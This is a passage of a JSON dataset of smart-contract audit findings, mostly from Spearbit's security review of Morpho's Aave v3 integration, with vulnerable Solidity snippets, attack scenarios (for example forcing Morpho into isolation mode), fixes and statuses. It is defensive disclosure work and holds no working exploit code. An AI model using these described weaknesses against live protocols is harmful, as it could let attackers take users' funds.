      "protocol_name": "Hubble Exchange",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/116",
      "tags": [],
      "finders": [
        "carrotsmuggler",
        "rogue-lion-0619",
        "qckhp",
        "0x52",
        "p12473",
        "kutugu",
        "0x3e84fa45",
        "0xbepresent",
        "0xDjango",
        "dirk\\_y",
        "qbs"
      ]
    },
    {
      "id": "16235",
      "title": "User rewards can be claimed to treasury by DAO",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- Morpho.sol#L269\n- MorphoInternal.sol#L112\n\n## Description\nWhen a user claims rewards, the rewards for the entire Morpho contract position on Aave are claimed. The excess rewards remain in the Morpho contract until all users have claimed their rewards. These rewards are not tracked and can be withdrawn by the DAO through a `claimToTreasury` call.\n\n## Recommendation\nConsider tracking the reward balance or pay attention when claiming fees to the treasury by setting the amounts parameter only to the accrued fees.\n\n## Morpho\nYes, I don't think we'll add more logic for that since it would add lots of logic in the `claimToTreasury` function.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "16234",
      "title": "Its Impossible to set _isClaimRewardsPaused",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n**Context:** Morpho.sol#L266\n\n**Description:** The `claimRewards` function checks the `isClaimRewardsPaused` boolean value and reverts if it is true. Currently, there is no setter function in the code base that sets the `_isClaimRewardsPaused` boolean so it is impossible to change.\n\n**Recommendation:** Add a setter function with the `onlyOwner` modifier that is able to set the `_isClaimRewardsPaused` value in storage.\n\n**Morpho:** Fixed in PR 567.\n\n**Spearbit:** Fixed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "16233",
      "title": "There is no guarantee that the _rewardsManager is set when calling claimRewards",
      "impact": "LOW",
      "content": "## Security Report\n\n## Severity\n**Low Risk**\n\n## Context\n`Morpho.sol#L268`\n\n## Description\nSince the `_rewardsManager` address is set using a setter function in Morpho only and not in the MorphoStorage.sol constructor, there is no guarantee that the `_rewardsManager` is not the default address(0) value. This could cause failures when calling `claimRewards` if Morpho forgets to set the `_rewardsManager`.\n\n## Recommendation\nWhen calling `claimRewards`, there should be a check that the `_rewardsManager` is not `address(0)`.\n\n## Status\n- **Morpho**: Fixed in PR 658.\n- **Spearbit**: Fixed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "16232",
      "title": "_updateInDS does not \"bubble up\" the updated values of onPool and inP2P",
      "impact": "LOW",
      "content": "## Vulnerability Report\n\n## Severity: Low Risk\n\n### Context\n- `MorphoInternal.sol#L352-L353`\n- `MorphoInternal.sol#L410`\n\n### Description\nThe `_updateInDS` function takes as input `uint256 onPool` and `uint256 inP2P` that are passed not as reference, but as pure values.\n\n```solidity\nfunction _updateInDS(\n    address poolToken,\n    address user,\n    LogarithmicBuckets.Buckets storage poolBuckets,\n    LogarithmicBuckets.Buckets storage p2pBuckets,\n    uint256 onPool,\n    uint256 inP2P,\n    bool demoting\n) internal {\n    if (onPool <= Constants.DUST_THRESHOLD) onPool = 0;\n    if (inP2P <= Constants.DUST_THRESHOLD) inP2P = 0;\n    // ... other logic of the function\n}\n```\n\nThose values, if lower or equal to `Constants.DUST_THRESHOLD`, will be set to 0. The issue is that the updated version of `onPool` and `inP2P` is never bubbled up to the original caller, which will later use those values that could have been changed by the `_updateInDS` logic.\n\nFor example, the `_updateBorrowerInDS` function calls `_updateInDS` and relies on the value of `onPool` and `inP2P` to understand if the user should be removed or added to the list of borrowers.\n\n```solidity\nfunction _updateBorrowerInDS(address underlying, address user, uint256 onPool, uint256 inP2P, bool demoting) internal {\n    _updateInDS(\n        _market[underlying].variableDebtToken,\n        user,\n        _marketBalances[underlying].poolBorrowers,\n        _marketBalances[underlying].p2pBorrowers,\n        onPool,\n        inP2P,\n        demoting\n    );\n\n    if (onPool == 0 && inP2P == 0) {\n        _userBorrows[user].remove(underlying);\n    } else {\n        _userBorrows[user].add(underlying);\n    }\n}\n```\n\nLet's assume that `inP2P` and `onPool` passed as `_updateBorrowerInDS` inputs were equal to 1 (the value of `DUST_THRESHOLD`).\n\nIn this case, `_updateInDS` would update those values to zero because `1 <= DUST_THRESHOLD` and would remove the user from both the `poolBucket` and `p2pBuckets` of the underlying.\n\nWhen the function returns in the `_updateBorrowerInDS` context, the same user would not remove the underlying from his/her `_userBorrows` list of assets because the updated values of `onPool` and `inP2P` have not been bubbled up by the `_updateInDS` function.\n\nThe same conclusion could be made for all the \"root\" level codes that rely on the `onPool` and `inP2P` values, which could not have been updated with the new 0 value set by `_updateInDS`.\n\n### Recommendation\nConsider \"bubbling up\" the updated value of both `onPool` and `inP2P` variables from `_updateInDS` to be able to use those updated values also in the \"root\" level of the code.\n\n### Morpho\nRecommendation implemented in PR 626.\n\n### Spearbit\nFixed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "16231",
      "title": "_authorizeBorrow does not check if the Aave price oracle sentinel allows the borrowing operation",
      "impact": "MEDIUM",
      "content": "## Vulnerability Report\n\n## Severity\n**Medium Risk**\n\n## Context\n`PositionsManagerInternal.sol#L106-L126`\n\n## Description\nInside the Aave validation logic for the borrow operation, there's an additional check that prevents the user from performing the operation if it has been not allowed inside the `priceOracleSentinel`.\n\n```solidity\nrequire(\n    params.priceOracleSentinel == address(0) ||\n    IPriceOracleSentinel(params.priceOracleSentinel).isBorrowAllowed(),\n    Errors.PRICE_ORACLE_SENTINEL_CHECK_FAILED\n);\n```\n\nMorpho should implement the same check. If for any reason the borrow operation has been disabled on Aave, it should also be disabled on Morpho itself. While the transaction would fail in case Morpho's user would need to perform the borrow on the pool, there could be cases where the user is completely matched in P2P. In those cases, the user would have performed a borrow even if the borrow operation was not allowed on the underlying Aave pool.\n\n## Recommendation\nImplement the `priceOracleSentinel` check, reverting in case `IPriceOracleSentinel(priceOracleSentinel).isBorrowAllowed() == false`.\n\n## Morpho\nThe recommendation has been implemented in PR 599.\n\n## Spearbit\nFixed.",
      "summary": "\nThis bug report is about the Aave validation logic for the borrow operation. It states that when performing the borrow operation, an additional check should be implemented to make sure that it has been allowed inside the priceOracleSentinel. This is to make sure that if the borrow operation has been disabled on Aave, it should also be disabled on Morpho. If not, it could result in a user performing a borrow even if it was not allowed on the underlying Aave pool. The recommendation is to implement the priceOracleSentinel check, reverting in case IPriceOracleSentinel(priceOracleSentinel).isBorrowAllowed() == false. This recommendation was implemented in PR 599 and the issue has been resolved.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "16230",
      "title": "In _authorizeLiquidate , when healthFactor is equal to Constants.DEFAULT_LIQUIDATION_THRESHOLD Morpho is wrongly setting close factor to DEFAULT_CLOSE_FACTOR",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\nPositionsManagerInternal.sol#L181-L190\n\n## Description\nWhen the borrower's `healthFactor` is equal to `Constants.MIN_LIQUIDATION_THRESHOLD`, Morpho is returning the wrong value for the `closeFactor`, allowing only liquidate 50% of the collateral instead of the whole amount.\n\nWhen the `healthFactor` is lower or equal to the `Constants.MIN_LIQUIDATION_THRESHOLD`, Morpho should return `Constants.MAX_CLOSE_FACTOR`, following the same logic applied by Aave.\n\nNote that the user cannot be liquidated even if `healthFactor == MIN_LIQUIDATION_THRESHOLD` if the `priceOracleSentinel` is set and `IPriceOracleSentinel(params.priceOracleSentinel).isLiquidationAllowed() == false`. See how Aave performs the check inside `validateLiquidationCall`.\n\n## Recommendation\nConsider decoupling the logic that checks if a user can be liquidated and the logic that calculates the correct close factor to be used for the liquidation. After doing that, apply the correct fixes to follow the same behavior as Aave to determine the close factor.\n\n## Morpho\nRecommendation implemented in PR 571.\n\n## Spearbit\nFixed.",
      "summary": "\nMorpho is a platform that has found an issue with its setting of the close factor. The close factor is set to DEFAULT_CLOSE_FACTOR when the borrower's healthFactor is equal to Constants.MIN_LIQUIDATION_THRESHOLD. This is allowing only liquidation of 50% of the collateral instead of the whole amount. The recommendation is to decouple the logic that checks if a user can be liquidated and the logic that calculates the correct close factor to be used for the liquidation. After doing this, the correct fixes should be applied to follow the same behavior of Aave to determine the close factor. Morpho has implemented this recommendation in PR 571 and the issue has been fixed by Spearbit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "16229",
      "title": "Morpho should check that the _positionsManager used has the same _E_MODE_CATEGORY_ID and _ADDRESSES_PROVIDER values used by the Morpho contract itself",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- Morpho.sol#L48\n- MorphoSetters.sol#L59\n\n## Description\nBecause `_E_MODE_CATEGORY_ID` and `_ADDRESSES_PROVIDER` are immutable variables and because Morpho is calling the PositionsManager in a delegatecall context, it's fundamental that both Morpho and PositionsManager have been initialized with the same `_E_MODE_CATEGORY_ID` and `_ADDRESSES_PROVIDER` values. Morpho should also check the value of the `PositionsManager._E_MODE_CATEGORY_ID` and `PositionsManager._ADDRESSES_PROVIDER` in both the `setPositionsManager` and `initialize` function.\n\n## Recommendation\nImplement in both the `setPositionsManager` and `initialize` function a check that reverts if the values inside `_E_MODE_CATEGORY_ID` and `_ADDRESSES_PROVIDER` in Morpho and PositionsManager are not equal. Note that Morpho has to create a public getter for those immutable values because they are declared as internal.\n\n## Morpho Insight\nWe decided to store the variables in storage. We know it's not ideal in terms of gas, but we prefer to do so for safety considerations.\n\n## Spearbit Insight\nThe Morpho team has decided to implement the recommendation by changing the `_ADDRESSES_PROVIDER`, `_POOL`, and `_E_MODE_CATEGORY_ID` variables from immutable to storage. By doing that, the Morpho contract will not rely on the immutable values stored in the PositionManager when called via delegatecall, but will instead use the storage values of Morpho's contract. The implementation has been done in PR 597.\n\n## Additional Considerations\n1. Morpho has removed the event `Events.EModeSet` that was emitted during the `Morpho.initialize` function. They are now relying on the Aave side event emission. They should remember to update their current monitoring system to switch to the new behavior.\n   \n2. The `RewardsManager` constructor does not include the `_pool` in the list of user's inputs and relies on the values that come from `IMorpho(morpho).pool()`. With the new behavior of the PR, the Morpho contract could have been deployed but not initialized yet; in that case, `IMorpho(morpho).pool()` would return `address(0)`. Morpho should consider adding this additional check inside the constructor.",
      "summary": "\nThis bug report is about the Morpho contract, which is calling the PositionsManager in a delegatecall context. The issue is that both Morpho and PositionsManager must be initialized with the same _E_MODE_CATEGORY_ID and _ADDRESSES_PROVIDER values. To fix this, a check should be implemented in both the setPositionsManager and initialize functions, which would revert if the values in _E_MODE_CATEGORY_ID and _ADDRESSES_PROVIDER from Morpho and PositionsManager are not equal. \n\nTo address this issue, the Morpho team decided to change the _ADDRESSES_PROVIDER, _POOL, and _E_MODE_CATEGORY_ID variables from immutable to storage. This means that when Morpho is called via delegatecall, it will not rely on the immutable values stored in the PositionManager, but will instead use the storage value of the Morpho's contract.\n\nIn addition, Morpho removed the Events.EModeSet event that was emitted during the Morpho.initialize function and is now relying on the Aave side event emission. This should be noted and the current monitoring system should be updated to switch to the new behavior. Lastly, Morpho should consider adding an additional check inside the constructor of the RewardsManager, since the _pool is not included in the list of user's inputs and relies on the values that come from IMorpho(morpho).pool(). This is because the Morpho contract could be deployed but not initialized yet, in which case IMorpho(morpho).pool() would return address(0).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "16228",
      "title": "A high value of _defaultIterations could make the withdrawal and repay operations revert because of OOG",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- PositionsManager.sol#L146-L147\n- PositionsManager.sol#L176-L178\n- MatchingEngine.sol#L128-L158\n\n## Description\nWhen the user executes some actions, they can specify their own `maxIterations` parameter. The user `maxIterations` parameter is directly used in `supplyLogic` and `borrowLogic`. \n\nIn the `withdrawLogic`, Morpho recalculates the `maxIterations` to be used internally as `Math.max(_defaultIterations.withdraw, maxIterations)` and in `repayLogic`, it directly uses `_defaultIterations.repay` as the maximum number of iterations. \n\nThis parameter is used as the maximum number of iterations that the matching engine can perform to match suppliers/borrowers during promotion/demotion operations.\n\n### Function\n```solidity\nfunction _promoteOrDemote(\n    LogarithmicBuckets.Buckets storage poolBuckets,\n    LogarithmicBuckets.Buckets storage p2pBuckets,\n    Types.MatchingEngineVars memory vars\n) internal returns (uint256 processed, uint256 iterationsDone) {\n    if (vars.maxIterations == 0) return (0, 0);\n    uint256 remaining = vars.amount;\n    // matching engine code...\n    for (; iterationsDone < vars.maxIterations && remaining != 0; ++iterationsDone) {\n        // matching engine code\n        (onPool, inP2P, remaining) = vars.step(...);\n        // matching engine code...\n    }\n    // matching engine code...\n}\n```\n\nAs you can see, the iteration continues until the matching engine has matched enough balance, or the iterations have reached the maximum number of iterations. If the matching engine cannot match enough balance, it could revert because of Out Of Gas (OOG) if `vars.maxIterations` is a high value. \n\nFor the supply or borrow operations, the user is responsible for the specified number of iterations that might be done during the matching process. In that case, if the operations revert because of OOG, its not an issue per se. \n\nThe problem arises for withdraw and repay operations where Morpho imposes a strict number of operations, potentially causing all those transactions to revert if the matching engine doesnt match enough balance in time. \n\nKeep in mind that even if the transaction does not revert during the `_promoteOrDemote` logic, it could revert during the following operations simply because the `_promoteOrDemote` has consumed enough gas, leaving insufficient gas for the subsequent operations.\n\n## Recommendation\nConsider stress testing the correct value to be used for `_defaultIterations.repay` and `_defaultIterations.withdraw` to prevent these operations from reverting due to OOG.\n\n## Morpho\nWe are conducting studies on matching efficiency given a max iterations, as well as the gas consumed. This study should provide us with the appropriate max iterations that we should set.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThe bug report is about the maxIterations parameter that is used in the supplyLogic and borrowLogic functions of PositionsManager.sol and MatchingEngine.sol. It is used as the maximum number of iterations that the matching engine can do to match suppliers/borrowers during promotion/demotion operations. The problem is that if the matching engine cannot match enough balance, it could revert because of OOG (Out of Gas) if the maxIterations parameter is set too high. This is especially a problem for withdraw and repay operations, as Morpho is forcing the number of operations and could cause them to always revert if the matching engine does not match enough balance in time. \n\nMorpho's recommendation is to consider stress testing the correct value to be used for _defaultIterations.repay and _defaultIterations.withdraw to prevent those operations from reverting because of OOG. Morpho is also conducting studies on the matching efficiency given a max iterations as well as the gas consumed, which should give them the appropriate max iterations to set. Spearbit has acknowledged the recommendation.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "16227",
      "title": "Disable creating markets for siloed assets",
      "impact": "MEDIUM",
      "content": "## Medium Risk Report\n\n## Severity\nMedium Risk\n\n## Context\n`aave-v3/UserConfiguration.sol#L214`\n\n## Description\nAave-v3 introduced siloed-borrow assets and siloed-borrow mode for users. \n\n> \"This feature allows assets with potentially manipulatable oracles (for example, illiquid Uni V3 pairs) to be listed on Aave as single borrow assets i.e., if a user borrows a siloed asset, they cannot borrow any other asset. This helps mitigate the risk associated with such assets from impacting the overall solvency of the protocol.\" - Aave Docs\n\nThe Morpho contract should not be in siloed-borrowing mode to avoid its restrictions on borrowing any other listed assets, especially as borrowing on the pool might be required for withdrawals. If a market for the siloed asset is created at deployment, users might borrow the siloed asset and break borrowing any of the other assets.\n\n## Recommendation\nThere are two possible ways of handling siloed assets:\n\n### Disabling Market Creations\nDisallow creating markets for siloed assets as they shouldn't be borrowed on Morpho. Using them as collateral is also useless as they will likely have an LT/LTV of 0 on Aave.\n\n> \"A user can supply Siloed Asset just like any other asset using the supply() method in pool.sol, though, the asset will not be enabled to use as collateral i.e., the supplied amount will not add to the total collateral balance of the user.\" - Aave Docs\n\nThe Aave docs are misleading as supplying the siloed assets does indeed enable them as collateral, and there are no further restrictions on a siloed asset's LT/LTV. However, as this asset class is intended for assets with \"potentially manipulatable oracles,\" using them as collateral should be disabled on Morpho.\n\n### Deploying a Custom Morpho Pool\nAlternatively, if there is high demand for users to borrow this asset, Morpho can deploy a new set of contracts, similar to what is being done for the efficiency mode. The only suppliable and borrowable asset should be the siloed asset; all other markets should only allow supplying and withdrawing as collateral.\n\n## Additional Notes\n- **Morpho**: Fixed in PR 633.\n- **Spearbit**: Fixed. The `_createMarket` function now reverts when listing siloed assets. Setting an asset as siloed borrowing while it is already listed is unlikely to occur, and even if it occurs, there are likely already other borrow positions on Morpho, and borrowing the siloed asset would fail.",
      "summary": "\nAave-v3 introduced a new feature called siloed-borrow assets and siloed-borrow mode for users. This feature is intended to mitigate the risk associated with assets with potentially manipulatable oracles. However, this feature should not be enabled for the Morpho contract, as it would restrict users from borrowing any other listed assets, especially when a withdrawal is necessary. \n\nTo address this issue, there are two possible solutions. The first is to disable market creations for siloed assets, as they should not be used as collateral. The second is to deploy a custom Morpho pool, where the only suppliable and borrowable asset is the siloed asset; all other markets should only allow supplying and withdrawing as collateral. \n\nThe issue has been fixed in PR 633 and the _createMarket function now reverts when listing siloed assets. Even if it occurs, there are likely already other borrow positions on Morpho and borrowing the siloed asset would fail.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "16226",
      "title": "First reward claim is zero for newly listed reward tokens",
      "impact": "MEDIUM",
      "content": "## Security Analysis Report\n\n## Severity\n**Medium Risk**\n\n## Context\n- `RewardsManager.sol#L291`\n- `RewardsManager.sol#L434`\n- `aave-v3/RewardsDistributor.sol#L261`\n\n## Description\nWhen Aave adds a new reward token for an asset, the reward index for this (asset, reward) pair starts at 0. When an update in Morpho's reward manager occurs, it initializes all rewards for the asset and would initialize this new reward token with a `startingIndex` of 0.\n\n1. Time passes and emissions accumulate to all pool users, resulting in a new index `assetIndex`. Users who deposited in the pool through Morpho before this reward token was listed should receive their fair share of the entire emission rewards \\( (assetIndex - 0) * oldBalance \\), but they currently receive zero because `getRewards` returns early if the user's computed index is 0.\n\n2. Also note that the external `getUserAssetIndex(address user, address asset, address reward)` can be inaccurate because it doesn't simulate setting the `startingIndex` for reward tokens that haven't been set yet.\n\n3. A smaller issue that can happen when new reward tokens are added is that updates to the `startingIndex` are late; the `startingIndex` isn't initialized to 0 but to some asset index that accrued emissions for some time. Morpho on-pool users would lose some rewards until the first update to the asset. (They should accrue from index 0 but accrue from `startingIndex`.) Given frequent calls to the RewardManager that initializes all rewards for an asset, this difference should be negligible.\n\n## Recommendation\nThe special case for a computed user index (`_computeUserIndex`) of 0 in `getRewards` seems unnecessary because initializing `startingIndex` is always done before calling `_computeUserIndex` (except for the external `getUserAssetIndex` function). With the way `userIndex` is chosen in `_computeUserIndex`, a `userIndex` of 0 means `localRewardData.startingIndex` is 0, i.e., the (asset, reward) pair was correctly initialized to 0 in the contract.\n\n```solidity\nfunction _getRewards(uint256 userBalance, uint256 reserveIndex, uint256 userIndex, uint256 assetUnit)\ninternal\npure\nreturns (uint256 rewards)\n{\n    // If `userIndex` is 0, it means that it has not accrued reward yet.\n    if (userIndex == 0) return 0;\n    rewards = userBalance * (reserveIndex - userIndex);\n    assembly {\n        rewards := div(rewards, assetUnit)\n    }\n}\n```\n\n## Morpho\nThe suggested fix was implemented in PR 791. However, it was also suggested to update the `getUserAssetIndex` getter, which does not take into account a potential `startingIndex` != 0. I disagree with this, because exposing a virtual starting index update is inaccurate too: it's not guaranteed that the starting index of a reward asset already listed but not tracked by Morpho would be updated in the same block as the query.\n\nA first version of such a change was drafted in PR 795, but I don't think it's more accurate, so I'd rather be in favor of keeping the current version of the RewardsManager, acknowledging that the user index exposed through the getter may just not reflect a potential starting index update happening in the same block.\n\n## Spearbit\nMarked as fixed by PR 791. It would be more accurate (it would even be perfectly accurate from a third-party smart contract's POV calling it) but agree that this is an edge case that shouldn't happen often and it's unclear what this view function is even used for and if it needs to be fully accurate. The gain might not be worth the more complex code flow that is required for the fix. Documenting this limitation for third parties might be enough.",
      "summary": "\nThis bug report is about a problem with the RewardsManager.sol, RewardsDistributor.sol, and Morpho's reward manager. The issue is that when Aave adds a new reward token for an asset, the reward index for this (asset, reward) pair starts at 0. When an update in Morpho's reward manager occurs, it initializes all rewards for the asset, but this new reward token is initialized with a startingIndex of 0. This means that users who deposited on the pool through Morpho before this reward token was listed should receive their fair share of the entire emission rewards, but they currently receive zero because getRewards returns early if the user's computed index is 0.\n\nAdditionally, the external getUserAssetIndex(address user, address asset, address reward) may be inaccurate because it doesn't simulate setting the startingIndex for reward tokens that haven't been set yet. A smaller issue that can happen when new reward tokens are added is that updates to the startingIndex are late, and Morpho on-pool users would lose some rewards until the first update to the asset.\n\nThe recommendation is to remove the special case for a computed user index ( _computeUserIndex ) of 0 in getRewards, as initializing startingIndex is always done before calling _computeUserIndex (except for the external getUserAssetIndex function). A version of a fix was drafted in PR 795, but it was not deemed accurate enough, so the current version of the RewardsManager was kept with the understanding that the user index exposed through the getter may just not reflect a potential starting index update happening in the same block. The bug was marked as fixed by PR 791.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "16225",
      "title": "Collateral setters for Morpho / Aave can end up in a deadlock",
      "impact": "MEDIUM",
      "content": "## Medium Risk Report\n\n**Severity:** Medium Risk  \n**Context:** MorphoSetters.sol#L87-L107  \n\n## Description  \nOne can end up in a deadlock where changing the Aave pool or Morpho collateral state is not possible anymore because it can happen that Aave automatically turns the collateral asset off (for example, when withdrawing everything / getting liquidated).  \n\nImagine a collateral asset is turned on for both protocols:  \n```solidity\nsetAssetIsCollateralOnPool(true)  \nsetAssetIsCollateral(true)  \n```  \n\nThen, a user withdraws everything on Morpho / Aave, and Aave automatically turns it off. It's off on Aave but on on Morpho. It can't be turned on for Aave anymore because:  \n```solidity\nif (market.isCollateral) revert Errors.AssetIsCollateralOnMorpho();  \n```  \n\nBut it also can't be turned off on Morpho anymore because of:  \n```solidity\nif (!_pool.getUserConfiguration(address(this)).isUsingAsCollateral(_pool.getReserveData(underlying).id) {\n    revert Errors.AssetNotCollateralOnPool();  \n}  \n```  \n\nThis will be bad if new users deposit after having withdrawn the entire asset. The asset is collateral on Morpho but not on Aave, breaking an important invariant that could lead to liquidating the Morpho Aave position.  \n\n## Recommendation  \nKeep some buffer so not everything can be withdrawn; however, this doesn't completely fix the issue because liquidations allow seizing more assets than have been deposited. Consider always being able to turn an asset off on Morpho, regardless of the pool state. The check that it's also on the pool should only be required when turning an asset on as collateral on Morpho.  \n\n### Morpho:  \n- First, we plan to send aTokens for all assets to Morpho to prevent the LTV = 0 griefing attack so the only way it's possible is for Morpho to be liquidated.  \n- This scenario is very unlikely to happen, and if Morpho gets liquidated, the state is desynced anyway.  \n- At the first deposit of a user or unmatching process, the underlying will be deposited on the pool, resetting the asset as collateral by default even after the potential changes added by this PR on Aave.  \n\n**Spearbit:** Acknowledged.",
      "summary": "\nA bug has been identified in the code for MorphoSetters.sol, which is of medium risk. The bug occurs when a user withdraws everything from both Aave and Morpho, which causes Aave to automatically turn the collateral asset off. However, Morpho cannot turn the asset off because of a check that it is also on the pool, which creates a deadlock. This could lead to liquidating the Morpho Aave position if new users deposit after the asset has been withdrawn.\n\nTo prevent this, it is recommended that a buffer be kept so that not everything can be withdrawn. Additionally, the check that the asset is also on the pool should only be required when turning the asset on as collateral on Morpho. Morpho plans to send aTokens for all assets to Morpho to prevent the LTV = 0 griefing attack, and at the first deposit of a user or unmatching process, the underlying will be deposited on the pool, resetting the asset as collateral.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "16224",
      "title": "Morpho can end up in isolation mode",
      "impact": "HIGH",
      "content": "## Security Report\n\n## Severity\n**High Risk**\n\n## Context\n- aave-v3/SupplyLogic.sol#L78\n- aave-v3/ValidationLogic.sol#L711\n- aave-v3/UserConfiguration.sol#L194\n\n## Description\nAave-v3 introduced isolation assets and isolation mode for users:\n\n> \"Borrowers supplying an isolated asset as collateral cannot supply other assets as collateral (though they can still supply to capture yield). Only stablecoins that have been permitted by Aave governance to be borrowable in isolation mode can be borrowed by users utilizing isolated collateral up to a specified debt ceiling.\"\n\nThe Morpho contract has a single Aave position for all its users and does therefore not want to end up in isolation mode due to its restrictions. The Morpho code would still treat the supplied non-isolation assets as collateral for their Morpho users, allowing them to borrow against them, but the Aave position does not treat them as collateral anymore. Furthermore, Morpho can only borrow stablecoins up to a certain debt ceiling.\n\nMorpho can be brought into isolation mode:\n\n- Up to deployment, an attacker maliciously sends an isolated asset to the address of the proxy. Aave sets assets as collateral when transferred, such that the Morpho contract already starts out in isolation mode. This can even happen before deployment by precomputing addresses or simply frontrunning the deployment. This attack also works if Morpho does not intend to create a market for the isolated asset.\n- Upon deployment and market creation: An attacker or unknowing user is the first to supply an asset and this asset is an isolated asset; Morpho's Aave position automatically enters isolation mode.\n- At any time if an isolated asset is the only collateral asset. This can happen when collateral assets are turned off on Aave, for example, by withdrawing (or liquidating) the entire balance.\n\n## Recommendation\nNever end up in isolation mode. Upon deployment, consider setting a non-isolation asset as collateral by using `pool.supply` on behalf of the contract, or simply by sending an aToken of a non-isolated asset to the contract address. Also, consider adding a function calling `setReserveAsCollateral` to be able to turn off collateral for isolated assets at any time.\n\n**Note:** This function reverts if there is no balance.\n\n## Acknowledgements\n- **Morpho:** Acknowledged.\n- **Spearbit:** Acknowledged.",
      "summary": "\nThis bug report outlines the risks associated with the Aave-v3 protocol, which introduces an \"isolation mode\" for users. This mode restricts borrowers from supplying any assets other than a specified stablecoin as collateral, and also limits their borrowing up to a specified debt ceiling. The bug report outlines how the Morpho contract, which has a single Aave position for all its users, can inadvertently enter isolation mode through malicious or unknowing users.\n\nThe report recommends that Morpho never end up in isolation mode, and suggests that upon deployment, they consider setting a non-isolation asset as collateral, or adding a function to turn off collateral for isolated assets at any time. Both Morpho and Spearbit have acknowledged the bug report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "EBaizel",
        "JayJonah8",
        "Christoph Michel",
        "Datapunk",
        "Emanuele Ricci"
      ]
    },
